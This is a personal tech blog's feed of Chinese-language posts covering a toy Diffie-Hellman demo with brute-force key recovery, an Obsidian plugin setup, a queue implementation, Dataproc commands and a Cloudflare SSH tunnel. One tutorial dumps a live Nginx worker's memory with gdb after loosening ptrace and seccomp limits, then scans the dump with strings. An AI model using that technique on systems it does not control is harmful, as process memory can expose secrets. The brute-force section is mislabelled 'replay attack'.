<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom" xml:base="https://hung-jia-jun.github.io">
    <title>Jason&#39;s tech blog</title>
    <link href="https://hung-jia-jun.github.io/feed.xml" rel="self" >
    <link href="https://hung-jia-jun.github.io" >
    <updated>2026-01-05T05:33:28Z</updated>
    <id>https://hung-jia-jun.github.io</id>
        <entry>
            <title>
                技術筆記
                
            </title>
            <updated>2026-01-05T05:33:15Z</updated>
            <id>https://hung-jia-jun.github.io/</id>
            <content type="html">
                &lt;p&gt;Jason&#39;s 技術筆記&lt;/p&gt;
&lt;p&gt;若有錯誤歡迎來信指正&lt;br /&gt;
Email: jason.blog@zhichengs.site&lt;/p&gt;

            </content>
            <link href="https://hung-jia-jun.github.io/" >
        </entry>
        <entry>
            <title>
                密碼學 - 零知識證明 - 密鑰協商
                
            </title>
            <updated>2025-12-22T00:00:00.000Z</updated>
            <id>https://hung-jia-jun.github.io/技術文件/密碼學 - 零知識證明 - 密鑰協商/</id>
            <content type="html">
                &lt;img src=&quot;https://www.plantuml.com/plantuml/svg/SoWkIImgAStDuNA0inAJI_AB51npCfDJeMod_2GkBbjRXQUjQrvEwtxQt_niwWu5Mriki1e5NJkG0WKhgBH2WOv2keB6qoNBNsnU1LJuegFz-PJvppecF6rjrWGRytBsp6VJTZwViWWe_dnvuyk96u1ge6Otx44n6CAmKdZPkEFPvFQNirOyMmdLef28RltpcNjUDZGgE2hOAcYaQsabQYgeAXHmWUJWIh0OamHJ0RCAQemJr9WaY348TxzOqV5ytVIdhHkVx5hzT7qRo0niBlO6wNV2xWomd2F2xBpyabI5eipqZ18hME00RMZVzNnM2r3jipdDpsVlU3gXXyiXDIy575SG6W00&quot; alt=&quot;uml diagram&quot; /&gt;
&lt;h1 id=&quot;diffie-hellman&quot; tabindex=&quot;-1&quot;&gt;範例程式(Diffie-Hellman 方法)&lt;/h1&gt;
&lt;p&gt;讓我們用密碼學最常用的人名 Bob 與 Alice 舉例&lt;/p&gt;
&lt;p&gt;Bob 端&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;import random
# Diffie-Hellman
p = 23 # 公開參數
g = 5 # 公開參數

bob_private = random.randint(1, p-1)
bob_public = (g ** bob_private) % p  # 2
print(&amp;quot;Bob 的公開值：&amp;quot;, bob_public)

alice_public = int(input(&amp;quot;請輸入 Alice 的公開值: &amp;quot;))
bob_shared = (alice_public ** bob_private) % p
print(&amp;quot;Bob 計算的共享密鑰：&amp;quot;, bob_shared)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Alice 端&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;import random
p = 23 # 公開參數
g = 5 # 公開參數

alice_private = random.randint(1, p-1)
alice_public = (g ** alice_private) % p  # 8
print(&amp;quot;Alice 的公開值：&amp;quot;, alice_public)

bob_public = int(input(&amp;quot;請輸入 Bob 的公開值: &amp;quot;))
alice_shared = (bob_public ** alice_private) % p
print(&amp;quot;Alice 計算的共享密鑰：&amp;quot;, alice_shared)

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;只要輸入對方的公開數，就能計算出共享密鑰&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020250717223215.png&quot; alt=&quot;Pasted image 20250717223215.png&quot; /&gt;&lt;/p&gt;
&lt;h1 id=&quot;重放攻擊&quot; tabindex=&quot;-1&quot;&gt;重放攻擊&lt;/h1&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;# Eve 已知 g, p, alice_public
p = 23 # 公開參數
g = 5 # 公開參數
alice_public = 12

# Eve 嘗試所有可能的私鑰
for possible_private in range(1, p):
    if (g ** possible_private) % p == alice_public:
        print(&amp;quot;Alice 的私鑰是：&amp;quot;, possible_private)
        break
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&quot;離散對數問題&quot; tabindex=&quot;-1&quot;&gt;離散對數問題&lt;/h2&gt;
&lt;p&gt;在正常情況下，Eve（攻擊者）無法輕易算出 Alice 的私鑰，這正是 Diffie-Hellman 密鑰交換的安全基礎。&lt;br /&gt;
原因如下：&lt;br /&gt;
Alice 的公開值是：alice_public = (g ** alice_private) % p&lt;br /&gt;
Eve 想要知道 alice_private，必須解「離散對數問題」：已知 g、p、alice_public，求 alice_private&lt;br /&gt;
這個問題在大質數下是非常困難的（目前沒有有效的演算法），所以只要 p 夠大，Alice 的私鑰就很安全&lt;br /&gt;
但如果 p 很小（像教學範例 p=23），Eve 可以用暴力法：&lt;/p&gt;
&lt;p&gt;這種方法只適用於 p 很小的情況。&lt;br /&gt;
實務上 p 至少要 2048 位元，這樣 Eve 幾乎不可能算出 Alice 的私鑰。&lt;br /&gt;
總結：&lt;br /&gt;
p 小時，Eve 可以暴力破解 Alice 的私鑰&lt;br /&gt;
p 夠大時，Eve 幾乎不可能算出 Alice 的私鑰&lt;br /&gt;
這就是 Diffie-Hellman 的安全基礎&lt;/p&gt;
&lt;h1 id=&quot;安全質數&quot; tabindex=&quot;-1&quot;&gt;安全質數&lt;/h1&gt;
&lt;p&gt;選用夠大的「安全質數」可以防止離散對數被暴力攻擊&lt;br /&gt;
&lt;a href=&quot;https://datatracker.ietf.org/doc/html/rfc3526#section-2&quot; target=&quot;_blank&quot; class=&quot;external-link&quot;&gt;https://datatracker.ietf.org/doc/html/rfc3526#section-2&lt;/a&gt;&lt;/p&gt;

            </content>
            <link href="https://hung-jia-jun.github.io/技術文件/密碼學 - 零知識證明 - 密鑰協商/" >
        </entry>
        <entry>
            <title>
                安裝 Obsidian 語意搜尋套件
                
            </title>
            <updated>2025-12-22T00:00:00.000Z</updated>
            <id>https://hung-jia-jun.github.io/技術文件/安裝 Obsidian 語意搜尋套件/</id>
            <content type="html">
                &lt;p&gt;Plugin repo: &lt;a href=&quot;https://github.com/bbawj/obsidian-semantic-search?tab=readme-ov-file#demo&quot; target=&quot;_blank&quot; class=&quot;external-link&quot;&gt;https://github.com/bbawj/obsidian-semantic-search?tab=readme-ov-file#demo&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;在 Settings -&amp;gt; Community plugins -&amp;gt; Browse&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251217181636.png&quot; alt=&quot;Pasted image 20251217181636.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;搜尋 Semantic Search&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251217181747.png&quot; alt=&quot;Pasted image 20251217181747.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;安裝套件&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251217181834.png&quot; alt=&quot;Pasted image 20251217181834.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;啟用 Semantic 套件&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251217181933.png&quot; alt=&quot;Pasted image 20251217181933.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;安裝 ollama&lt;br /&gt;
&lt;a href=&quot;https://ollama.com/download&quot; target=&quot;_blank&quot; class=&quot;external-link&quot;&gt;https://ollama.com/download&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;下載 embeding model&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;ollama pull nomic-embed-text  
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;檢查 model 是否有安裝成功&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;$ ollama list
NAME                       ID              SIZE      MODIFIED   
nomic-embed-text:latest    0a109f422b47    274 MB    About an hour ago    
&lt;/code&gt;&lt;/pre&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;參數名稱&lt;/th&gt;
&lt;th&gt;設定值&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;API URL&lt;/td&gt;
&lt;td&gt;&lt;code&gt;http://localhost:11434/api/embed&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Model&lt;/td&gt;
&lt;td&gt;nomic-embed-text&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;設定參數&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251217182540.png&quot; alt=&quot;Pasted image 20251217182540.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;打開 command palette&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251217182721.png&quot; alt=&quot;Pasted image 20251217182721.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;按照以下順序執行&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251217182834.png&quot; alt=&quot;Pasted image 20251217182834.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;之後就可以用這個進行語意搜尋&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251217183031.png&quot; alt=&quot;Pasted image 20251217183031.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;整體語意搜尋結果還不錯&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251217183146.png&quot; alt=&quot;Pasted image 20251217183146.png&quot; /&gt;&lt;/p&gt;
&lt;h1 id=&quot;總結&quot; tabindex=&quot;-1&quot;&gt;總結&lt;/h1&gt;
&lt;p&gt;透過這個 obsidian 工具，可以做到語意級別的模糊搜尋，有時候可能就是模糊的感覺，沒有明確的關鍵字，就可以考慮用這個搜尋工具進行搜尋。&lt;/p&gt;

            </content>
            <link href="https://hung-jia-jun.github.io/技術文件/安裝 Obsidian 語意搜尋套件/" >
        </entry>
        <entry>
            <title>
                實作 queue (Linked list)
                
            </title>
            <updated>2025-12-22T00:00:00.000Z</updated>
            <id>https://hung-jia-jun.github.io/技術文件/其他/演算法/實作 queue (Linked list)/</id>
            <content type="html">
                &lt;p&gt;以雙向鍊表做這個 queue 資料結構&lt;/p&gt;
&lt;h2 id=&quot;流程&quot; tabindex=&quot;-1&quot;&gt;流程&lt;/h2&gt;
&lt;h3 id=&quot;新增物件&quot; tabindex=&quot;-1&quot;&gt;新增物件&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;建立 HEAD 與 Oldest 作為基礎框架&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020241119192535.png&quot; alt=&quot;Pasted image 20241119192535.png&quot; /&gt;&lt;/li&gt;
&lt;li&gt;新增物件到頭位置&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020241119192725.png&quot; alt=&quot;Pasted image 20241119192725.png&quot; /&gt;&lt;/li&gt;
&lt;li&gt;調整鍊表 node 的 next 與 previous reference&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020241119192802.png&quot; alt=&quot;Pasted image 20241119192802.png&quot; /&gt;&lt;/li&gt;
&lt;li&gt;更新 HEAD 位置&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020241119192911.png&quot; alt=&quot;Pasted image 20241119192911.png&quot; /&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;完成新增 node 到 linked list 頭部的部分&lt;/p&gt;
&lt;h3 id=&quot;移除物件&quot; tabindex=&quot;-1&quot;&gt;移除物件&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;目前狀態&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020241119193023.png&quot; alt=&quot;Pasted image 20241119193023.png&quot; /&gt;&lt;/li&gt;
&lt;li&gt;移動 Oldest 指針到 Oldest 物件的上一個節點&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020241119194633.png&quot; alt=&quot;Pasted image 20241119194633.png&quot; /&gt;&lt;/li&gt;
&lt;li&gt;移除參考&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020241119194708.png&quot; alt=&quot;Pasted image 20241119194708.png&quot; /&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Example code&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# FIFO calss
class LinkElement:
    def __init__(self) -&amp;gt; None:
        self.next = None
        self.previous = None
        self.message = &#39;&#39;

class Queue:
    def __init__(self) -&amp;gt; None:
        self.head = LinkElement()
        self.oldest = LinkElement()
        self.head.next = self.oldest
        self.oldest.previous = self.head


    def push(self, message: str):
        link_ele = LinkElement()
        link_ele.message = message
        link_ele.next = self.head
        self.head.previous = link_ele
        self.head = link_ele

    def pull(self):
        try:
            msg = self.oldest.message
            if self.oldest.previous:
                self.oldest = self.oldest.previous
                self.oldest.next = None
            return msg
        except Exception as e:
            return None

queue = Queue()

for i in range(10):
    print (str(i))
    queue.push(str(i))

for i in range(12):
    print(queue.pull())
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;output&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;0
1
2
3
4
5
6
7
8
9


0
1
2
3
4
5
6
7
8
9
&lt;/code&gt;&lt;/pre&gt;

            </content>
            <link href="https://hung-jia-jun.github.io/技術文件/其他/演算法/實作 queue (Linked list)/" >
        </entry>
        <entry>
            <title>
                使用 pmap、smaps 與 gdb Dump 出 Nginx Worker 記憶體區段教學
                
            </title>
            <updated>2025-12-22T00:00:00.000Z</updated>
            <id>https://hung-jia-jun.github.io/技術文件/使用 pmap、smaps 與 gdb Dump 出 Nginx Worker 記憶體區段教學/</id>
            <content type="html">
                &lt;h1 id=&quot;主旨&quot; tabindex=&quot;-1&quot;&gt;主旨&lt;/h1&gt;
&lt;pre&gt;&lt;code&gt;本教學示範如何透過 Linux 的 pmap、/proc/&amp;lt;pid&amp;gt;/smaps 與 gdb 取得指定 process 的匿名記憶體區段，並導出成 dump 檔供後續分析。
&lt;/code&gt;&lt;/pre&gt;
&lt;hr /&gt;
&lt;h2 id=&quot;0-nginx-process&quot; tabindex=&quot;-1&quot;&gt;0. 找出 nginx process&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251110210252.png&quot; alt=&quot;Pasted image 20251110210252.png&quot; /&gt;&lt;/p&gt;
&lt;h2 id=&quot;1&quot; tabindex=&quot;-1&quot;&gt;1. 找出記憶體佔用最高的區段&lt;/h2&gt;
&lt;p&gt;首先使用 pmap 檢查 Nginx worker 的 memory map，並依 RSS 由大到小排序：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ pmap -x 135 | sort -k 3 -n -r | head -3
total kB         2709340  412896  407496
00007fe347600000  468992  393644  393644 rw---   [ anon ]
00007fe3423ee000    5632    3860    3860 rw---   [ anon ]
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;重點：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;RSS&lt;/code&gt; 欄位表示實際佔用的實體記憶體。&lt;/li&gt;
&lt;li&gt;第一筆最大者：&lt;code&gt;00007fe347600000&lt;/code&gt;，RSS 約 393MB。&lt;/li&gt;
&lt;li&gt;標記為 &lt;code&gt;[ anon ]&lt;/code&gt;，通常代表匿名 mmap 或 GC heap、buffer、cache 等。&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2 id=&quot;2-smaps&quot; tabindex=&quot;-1&quot;&gt;2. 用 smaps 確認該地址區段的完整範圍&lt;/h2&gt;
&lt;p&gt;pmap 顯示的是區段起始地址，但實際區段長度需從 smaps 查詢。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ cat /proc/135/smaps | grep 7fe347600000
7fe34296e000-7fe347600000 r--s 00000000 00:36 2640400 /data/nginx/ip2proxy/PX2_CUSTOMER.mmdb
7fe347600000-7fe364000000 rw-p 00000000 00:00 0
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;解讀：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;第一段：&lt;code&gt;7fe34296e000-7fe347600000&lt;/code&gt; 是 memory-mapped file (&lt;code&gt;PX2_CUSTOMER.mmdb&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;第二段：&lt;code&gt;7fe347600000-7fe364000000&lt;/code&gt; 是匿名記憶體 (&lt;code&gt;rw-p ... 0&lt;/code&gt;)&lt;br /&gt;
這就是 pmap 顯示為 &lt;code&gt;[ anon ]&lt;/code&gt; 的那一段。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;因此要 dump 的實際區段範圍為：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;start: 0x7fe347600000 
end:   0x7fe364000000
&lt;/code&gt;&lt;/pre&gt;
&lt;hr /&gt;
&lt;h2 id=&quot;3-gdb-attach&quot; tabindex=&quot;-1&quot;&gt;3. 使用 gdb attach 進程&lt;/h2&gt;
&lt;p&gt;進入 gdb：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;$ gdb -pid 135&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;若出現權限問題，需確認：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;容器需加上 &lt;code&gt;--cap-add=SYS_PTRACE --security-opt seccomp=unconfined&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;或需在宿主機設置 &lt;code&gt;kernel.yama.ptrace_scope=0&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2 id=&quot;4-gdb-dump&quot; tabindex=&quot;-1&quot;&gt;4. 在 gdb 裡 dump 出記憶體檔案&lt;/h2&gt;
&lt;p&gt;進入 gdb 之後，執行：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;(gdb) dump memory /tmp/memdump_1 0x7fe347600000 0x7fe364000000&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;說明：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;/tmp/memdump_1&lt;/code&gt; 為輸出檔案路徑&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;開始地址與結束地址對應 smaps 的匿名記憶體範圍&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;假如 dump 成功，會在 &lt;code&gt;/tmp&lt;/code&gt; 看到數百 MB 至數 GB 的檔案。&lt;/p&gt;
&lt;hr /&gt;
&lt;h2 id=&quot;5-dump&quot; tabindex=&quot;-1&quot;&gt;5. 後續分析 dump 檔案&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;讀取可見字串：&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;code&gt;$ strings /tmp/memdump_1 | less&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251110210134.png&quot; alt=&quot;Pasted image 20251110210134.png&quot; /&gt;&lt;/p&gt;

            </content>
            <link href="https://hung-jia-jun.github.io/技術文件/使用 pmap、smaps 與 gdb Dump 出 Nginx Worker 記憶體區段教學/" >
        </entry>
        <entry>
            <title>
                GCP dataproc 運行 python scripts
                
            </title>
            <updated>2025-12-22T00:00:00.000Z</updated>
            <id>https://hung-jia-jun.github.io/技術文件/pySpark/GCP dataproc 運行 python scripts/</id>
            <content type="html">
                &lt;p&gt;建立 dataproc cluster&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;gcloud dataproc clusters create jason-test-spark-job &#92;
    --region=us-central1 &#92;
    --properties=&#39;^#^dataproc:conda.packages=google-cloud-storage==2.18.2#yarn:yarn.scheduler.maximum-allocation-mb=256928#yarn:yarn.nodemanager.resource.memory-mb=256928&#39;
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&quot;properties&quot; tabindex=&quot;-1&quot;&gt;properties&lt;/h2&gt;
&lt;p&gt;在 package 裡面安裝 python package&lt;br /&gt;
&lt;code&gt;dataproc:conda.packages=google-cloud-storage==2.18.2&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;指定 memory 使用量&lt;br /&gt;
&lt;code&gt;yarn:yarn.scheduler.maximum-allocation-mb=256928#yarn:yarn.nodemanager.resource.memory-mb=256928&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&quot;pyspark-pip-install&quot; tabindex=&quot;-1&quot;&gt;pyspark pip install&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;建立&lt;br /&gt;
requirements.txt&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code&gt;pytest==6.2.5
pyspark==3.2.0
google-cloud-storage==1.43.0
mlflow==1.23.0
&lt;/code&gt;&lt;/pre&gt;
&lt;ol start=&quot;2&quot;&gt;
&lt;li&gt;寫 pip init 腳本&lt;br /&gt;
pip_init.py&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code&gt;#!/bin/bash
# 1. 確認 requirements.txt 文件是否已經上傳到 GCS 並下載到本地
GCS_BUCKET_PATH=&amp;quot;gs://dataproc-staging-us-central1-473678078038-tw1bdolx/requirements.txt&amp;quot;

LOCAL_PATH=&amp;quot;/tmp/requirements.txt&amp;quot;

# 下載 requirements.txt
gsutil cp ${GCS_BUCKET_PATH} ${LOCAL_PATH}

# 使用 pip 安裝依賴
pip install -r ${LOCAL_PATH}
&lt;/code&gt;&lt;/pre&gt;
&lt;ol start=&quot;3&quot;&gt;
&lt;li&gt;上傳檔案&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code&gt;gsutil cp requirements.txt gs://dataproc-staging-us-central1-473678078038-tw1bdolx/
gsutil cp pip_init.sh gs://dataproc-staging-us-central1-473678078038-tw1bdolx/
&lt;/code&gt;&lt;/pre&gt;
&lt;ol start=&quot;4&quot;&gt;
&lt;li&gt;
&lt;p&gt;刪除原本的 cluster&lt;br /&gt;
&lt;code&gt;gcloud dataproc clusters delete jason-test-spark-job --region=us-central1&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;建立 cluster 時運行腳本&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code&gt;gcloud dataproc clusters create jason-test-spark-job &#92;
--region=us-central1 &#92;
--initialization-actions=gs://dataproc-staging-us-central1-473678078038-tw1bdolx/pip_init.sh
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&quot;delete-cluster&quot; tabindex=&quot;-1&quot;&gt;Delete cluster&lt;/h1&gt;
&lt;p&gt;&lt;code&gt;gcloud dataproc clusters delete jason-test-spark-job --region=us-central1&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&quot;submit-job&quot; tabindex=&quot;-1&quot;&gt;Submit job&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;gcloud dataproc jobs submit pyspark test.py --region=us-central1 --cluster jason-test-spark-job&lt;/code&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;[!IMPORTANT]&lt;br /&gt;
記得要切換 GCP 環境 (SIT/UAT/PROD)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#python&quot;&gt;#python&lt;/a&gt; &lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#pyspark&quot;&gt;#pyspark&lt;/a&gt; &lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#spark&quot;&gt;#spark&lt;/a&gt; &lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#cluster&quot;&gt;#cluster&lt;/a&gt;&lt;/p&gt;

            </content>
            <link href="https://hung-jia-jun.github.io/技術文件/pySpark/GCP dataproc 運行 python scripts/" >
        </entry>
        <entry>
            <title>
                Cloudflare tunnel 研究
                
            </title>
            <updated>2025-12-22T00:00:00.000Z</updated>
            <id>https://hung-jia-jun.github.io/技術文件/other/Cloudflare tunnel 研究/</id>
            <content type="html">
                &lt;h1 id=&quot;目的&quot; tabindex=&quot;-1&quot;&gt;目的&lt;/h1&gt;
&lt;p&gt;手上有一台 respberry pi 3 b+&lt;br /&gt;
想在外網使用 ssh 連入進行個人機開發 or 實驗&lt;/p&gt;
&lt;p&gt;參考網站&lt;br /&gt;
&lt;a href=&quot;https://developers.cloudflare.com/cloudflare-one/connections/connect-networks/use-cases/ssh/ssh-cloudflared-authentication/?utm_source=chatgpt.com&quot; target=&quot;_blank&quot; class=&quot;external-link&quot;&gt;https://developers.cloudflare.com/cloudflare-one/connections/connect-networks/use-cases/ssh/ssh-cloudflared-authentication/?utm_source=chatgpt.com&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;流程解釋(來自官網)&quot; tabindex=&quot;-1&quot;&gt;流程解釋(來自官網)&lt;/h2&gt;
&lt;p&gt;使用者可以透過在原生終端機中驗證 &lt;code&gt;cloudflared&lt;/code&gt; ，連接到 SSH 伺服器，而無需 WARP 客户端。 此方法需要伺服器和客户端兩者都已安裝 &lt;code&gt;cloudflared&lt;/code&gt; ，以及 Cloudflare 上的活躍 Zone。 流量會透過此連線被 Proxy，使用者會使用 Cloudflare Access 憑證登入伺服器。&lt;/p&gt;
&lt;p&gt;來到 cloudflare &lt;code&gt;Overview/Tunnels&lt;/code&gt; 按下「新增通道」&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251218100540.png&quot; alt=&quot;Pasted image 20251218100540.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;使用 Cloudflared 的方案&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251218100617.png&quot; alt=&quot;Pasted image 20251218100617.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;設定通道名稱&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251218100643.png&quot; alt=&quot;Pasted image 20251218100643.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;選擇 Respberrry pi 的 Debian 作業系統的選項&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251218102645.png&quot; alt=&quot;Pasted image 20251218102645.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;複製安裝指令&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251218102723.png&quot; alt=&quot;Pasted image 20251218102723.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;ssh 登入到本地的 Respberry pi 機器&lt;br /&gt;
並貼上安裝指令碼&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020250717152029.png&quot; alt=&quot;Pasted image 20250717152029.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;安裝後啟動 cloudflared 服務&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251218104151.png&quot; alt=&quot;Pasted image 20251218104151.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;註冊完成&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251218104238.png&quot; alt=&quot;Pasted image 20251218104238.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;cloudflare 儀表板已出現註冊的機器&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251218111615.png&quot; alt=&quot;Pasted image 20251218111615.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;按「下一步」&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251218111632.png&quot; alt=&quot;Pasted image 20251218111632.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;輸入下列資訊，並按下「完成設定」&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251218111700.png&quot; alt=&quot;Pasted image 20251218111700.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;現在已建立完通道，主機端連線設定已完成&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251218111725.png&quot; alt=&quot;Pasted image 20251218111725.png&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;
&lt;h1 id=&quot;client&quot; tabindex=&quot;-1&quot;&gt;client 連線端設定&lt;/h1&gt;
&lt;p&gt;參考資料: &lt;a href=&quot;https://developers.cloudflare.com/cloudflare-one/connections/connect-networks/downloads/#macos&quot; target=&quot;_blank&quot; class=&quot;external-link&quot;&gt;https://developers.cloudflare.com/cloudflare-one/connections/connect-networks/downloads/#macos&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;mac 上面安裝&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;brew install cloudflared
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在 SSH 設定檔中變更：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;vim ~/.ssh/config
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;輸入以下值&lt;br /&gt;
